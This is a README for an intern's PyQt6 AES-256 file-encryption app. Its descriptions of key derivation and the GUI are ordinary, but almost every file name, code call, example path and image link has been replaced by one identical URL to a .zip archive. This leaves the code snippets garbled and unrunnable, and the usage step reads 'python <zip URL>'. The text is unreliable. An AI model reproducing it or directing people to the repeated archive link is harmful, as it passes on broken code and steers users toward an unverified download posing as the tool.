# ADVANCED-ENCRYPTION-TOOL

*COMPANY*: CODTECH IT SOLUTIONS

*NAME*:  Kanchan Vilas Jadhav

*INTERN ID*: CT04DA375

*DOMAIN*: Cyber Security & Ethical Hacking

*DURATION*: 4 WEEKS

*MENTOR*: NEELA SANTOSH

# DESCRIPTION OF TASK: The goal of this project is to build a secure desktop application using Python, PyQt6, and the Cryptography library. The application allows users to encrypt and decrypt files using AES-256 encryption, with a focus on strong security, usability, and modern design.


# Editor used: VS Studio

# 📁File 1: https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip
-Purpose: Handles AES-256 encryption and decryption logic.
 derive_key(password, salt)

-What it does:

Uses your password + a random salt to create a secure 256-bit key.

Uses PBKDF2 (a secure key derivation algorithm) with SHA-256.

def derive_key(password, salt):
    kdf = PBKDF2HMAC(...)
    return https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip())

-Why:

We never use the password directly as an encryption key.

This makes brute-forcing much harder.

✅ encrypt_file(file_path, password)
-What it does:

~Reads your file into bytes.

~Generates a salt and IV (Initialization Vector).

~Derives an AES key using your password and salt.

~Encrypts the file using AES in CFB (Cipher Feedback) mode.

~Writes out a new file: [original name].enc, with the salt + IV + ciphertext.


cipher = Cipher(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(key), https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(iv))
encrypted = https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(data) + https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
Output: A .enc file that only your password can decrypt.

✅ decrypt_file(file_path, password)
-What it does:

~Reads an encrypted file.

~Extracts the salt and IV.

~Re-derives the key using your password + extracted salt.

~Decrypts the data with AES.

~Writes out a new file [original name].dec.

decrypted = https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(encrypted_data) + https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()


# 📁 File 2: https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip
-Purpose: Defines the PyQt6 GUI logic.

✅ EncryptorApp(QWidget)
This class is the main app window.

- UI Components:
QLineEdit: for password input.

QPushButton: for encrypt/decrypt.

QListWidget: to show file history.

QLabel: to display messages.

setAcceptDrops(True): allows drag-and-drop support.

✅ load_history() and update_history(path)
These manage the file history list (stored in https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip):

Load history on startup.

Save a list of recent encrypted/decrypted files.

Show them in the bottom list.

✅ select_and_encrypt() / select_and_decrypt()
Show a file dialog to let you choose a file.

When a file is selected, it encrypts/decrypts using your password.

Results are shown in a label.

History is updated.

✅ encrypt(path) and decrypt(path)
These functions:

Read the password from the field.

Call encrypt_file or decrypt_file.

Show success or error messages.

✅ dragEnterEvent() and dropEvent()
These handle drag and drop:

Accepts files dragged into the window.

Encrypts or decrypts automatically based on file extension.

If .enc → decrypt

Else → encrypt

# 📁 File 3: https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip
-Purpose: Launch the GUI app.

from ui_main import EncryptorApp

if __name__ == "__main__":
    app = QApplication(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip)
    window = EncryptorApp()
    https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
    https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip(https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip())
-This is the entry point. It:

Creates a Qt application.

Loads the GUI window.

Starts the event loop (to wait for clicks, drags, etc.).


# How to Use the Encryption App GUI:
Once you’ve run python https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip, the window should appear with:

 A password input field

 Encrypt and Decrypt buttons

 Drag-and-drop support

 A file history list at the bottom

1. Step 1: Enter a Password
This is required for both encryption and decryption.

Type your chosen password into the field at the top.

Use something strong but memorable (this is what protects your data).

2. Step 2: Encrypt a File
Option A: Click "Encrypt File"
Click the Encrypt File button.

Choose the file you want to encrypt.

It will create a new file ending in .enc (e.g. https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip).

You’ll see the output path in the status bar.

Option B: Drag & Drop
Drag any file from your file explorer into the app window.

If it's not already encrypted, it will be encrypted automatically.

3. Step 3: Decrypt a File
Option A: Click "Decrypt File"
Click the Decrypt File button.

Select a .enc file.

It will decrypt the file to a new one ending in .dec (e.g. https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip).

Option B: Drag & Drop
Drag a .enc file into the app window.

If a password was already entered, it will decrypt automatically.

4. Step 4: Review File History
At the bottom, you'll see a list of the last 10 files you've encrypted/decrypted.

This helps you find where your files were saved.

Double-clicking functionality can be added if you'd like to open them directly from the list.


# Summary
-Feature	Where It's Handled

AES-256 encryption	https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
AES-256 decryption	https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
Password input	QLineEdit in https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip
Drag-and-drop	dragEnterEvent() + dropEvent()
File picker	https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip()
File history	JSON file + QListWidget
GUI Window	PyQt6 via EncryptorApp(QWidget)


# Output: 
<img width="383" alt="Image" src="https://raw.githubusercontent.com/codeK0/ADVANCED-ENCRYPTION-TOOL/main/octuple/ADVANCE-TOOL-ENCRYPTIO-v2.6-alpha.1.zip" />
